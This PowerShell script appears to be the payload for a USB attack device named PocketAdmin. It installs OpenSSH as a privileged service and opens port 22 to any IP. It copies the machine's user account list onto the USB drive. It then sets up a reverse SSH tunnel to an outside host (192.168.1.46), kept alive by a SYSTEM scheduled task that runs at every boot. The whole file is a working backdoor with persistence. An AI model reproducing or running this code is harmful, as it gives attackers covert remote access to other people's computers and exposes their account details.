# find driveletter of a volume with FAT label set to POCKETADMIN
foreach($volume in (Get-WMIObject -Class Win32_Volume))
{
  if($volume.Label -eq "POCKETADMIN") {$drive = $volume.Name}
}

# if sshd service already exists, delete it together with sshd firewall rule
if (Get-Service sshd -ErrorAction SilentlyContinue) 
{
   Stop-Service sshd
   sc.exe delete sshd 1>$null
   netsh advfirewall firewall delete rule name=sshd
}

# copy openssh binaries and setup scripts to the target machine
New-Item -ItemType Directory -Name "OpenSSH" -Path "C:\Program Files\" -ErrorAction SilentlyContinue
Copy-Item -Recurse -Path "${drive}OpenSSH-Win64\*" -Destination "C:\Program Files\OpenSSH\"

# copy ssh configuration files to the target machine, make sure file permissions are set up correctly
New-Item -ItemType Directory -Name "ssh" -Path "C:\ProgramData\" -ErrorAction SilentlyContinue
Copy-Item -Recurse -Path "${drive}global\*" -Destination "C:\ProgramData\ssh\"
& "C:\Program Files\OpenSSH\FixAllPermissions.ps1"

# create sshd service, allow incoming connections to port 22 through windows firewall
New-Service -Name sshd -DisplayName "OpenSSH Server" -BinaryPathName "C:\Program Files\OpenSSH\sshd.exe" -Description "OpenSSH Server" -StartupType Automatic
sc.exe privs sshd SeAssignPrimaryTokenPrivilege/SeTcbPrivilege/SeBackupPrivilege/SeRestorePrivilege/SeImpersonatePrivilege
netsh advfirewall firewall add rule name=sshd dir=in action=allow enable=yes remoteIP=any protocol=TCP localport=22
Write-Host -ForegroundColor Green "sshd service successfully installed"

# save information about target machine user accounts in a text file on PocketAdmin's storage
# start from filename "port2200.txt", keep incrementing until already used names are skipped 
New-Item -ItemType Directory -Name "portusers" -Path "${drive}" -ErrorAction SilentlyContinue
$portnumber = [int] 2200
$portstring = $portnumber.ToString()
while(Test-Path "${drive}portusers\port${portstring}.txt")
{
  $portnumber = $portnumber + 1
  $portstring = $portnumber.ToString()
}
Get-WmiObject -Class Win32_UserAccount | Format-List -Property Name,FullName,Description,AccountType,Disabled,LocalAccount | Out-File "${drive}portusers\port${portstring}.txt"

# create persist.ps1 script to restart ssh reverse tunnel in case it breaks; set port forwarding to the same port as in filename
$ipstring = [string] "192.168.1.46"
"while(1) { & ""C:\Program Files\OpenSSH\ssh.exe"" -R ${ipstring}:${portstring}:127.0.0.1:22 peasant@${ipstring} -p 22 -N; Start-Sleep 20 }" | Out-File "C:\Program Files\OpenSSH\persist.ps1"

# start sshd service
Start-Service -Name sshd

# create a scheduled task which will run persist.ps1 script at every bootup, run this task right away
schtasks.exe /Delete  /TN persistSSH /F
schtasks.exe /Create /RU SYSTEM /SC ONSTART /TN persistSSH /TR " powershell.exe -exec bypass & \""\""\""C:\Program Files\OpenSSH\persist.ps1\""\""\"" "  /RL HIGHEST /F
schtasks.exe /Run /TN persistSSH

#try to eject the PocketAdmin's usb drive
(New-Object -comObject Shell.Application).NameSpace(17).ParseName("${drv}:").InvokeVerb("Eject")
